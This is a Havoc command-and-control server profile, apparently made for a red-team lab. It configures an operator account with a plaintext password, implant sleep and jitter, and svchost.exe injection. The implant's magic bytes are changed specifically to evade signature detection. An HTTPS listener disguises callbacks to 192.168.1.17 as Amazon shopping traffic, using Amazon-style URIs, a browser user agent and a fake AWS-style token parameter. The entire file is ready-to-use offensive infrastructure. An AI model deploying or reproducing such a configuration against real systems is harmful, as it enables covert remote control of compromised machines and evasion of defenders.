# Havoc C2 Profile
# Generated by HavocObscura
# Date: 2026-06-10
# Target: https://www.amazon.com

Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm       = "/usr/bin/nasm"
    }
}

Operators {
    user "dmcxblue" {
        Password = "rt2025"
    }
}

Demon {
    Sleep  = 10
    Jitter = 35
    # 4-byte magic identifier in every Demon packet header. Change to avoid 0xDEADBEEF signature detection.
    Magic  = "0xFEEDFACE"

    # Use X-Forwarded-For for client IP when behind a redirector (nginx, Azure Function, etc.)
    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\svchost.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\svchost.exe"
    }
}

Listeners {
    Http {
        Name         = "RTOLab"
        # Hosts = callback address(es) baked into the demon — set to an IP the target can reach
        Hosts        = ["192.168.1.17"]
        # HostBind = local bind address; 0.0.0.0 listens on all interfaces regardless of assigned IP
        HostBind     = "192.168.1.17"
        HostRotation = "round-robin"
        PortBind     = 443
        PortConn     = 443
        Secure       = true
        KillDate     = "2028-06-10 23:59:59"
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

        # Prepended to all URIs in the Demon config so requests route through the redirector's path prefix
        UriPrefix = ""

        Uris = [
            "/gp/cart/view.html",
            "/gp/product/ajax",
            "/api/recommendations",
            "/gp/aod/ajax",
            "/s",
        ]

        Headers = [
            "Accept: */*",
            "Accept-Language: en-US,en;q=0.9",
            "Cache-Control: no-cache",
        ]

        # Where to place the 12-byte metadata token [Size|Magic|AgentID].
        # Options: "body" (default), "header", "cookie", "parameter"
        # Use non-body for redirectors (Azure Functions, etc.) that may mangle request bodies.
        HavocId {
            Location = "parameter"
            Name     = "X-Amz-Security-Token"
        }

        Response {
            Headers = [
                "Content-Type: application/octet-stream",
                "Cache-Control: no-store, max-age=0",
            ]
        }
    }

}


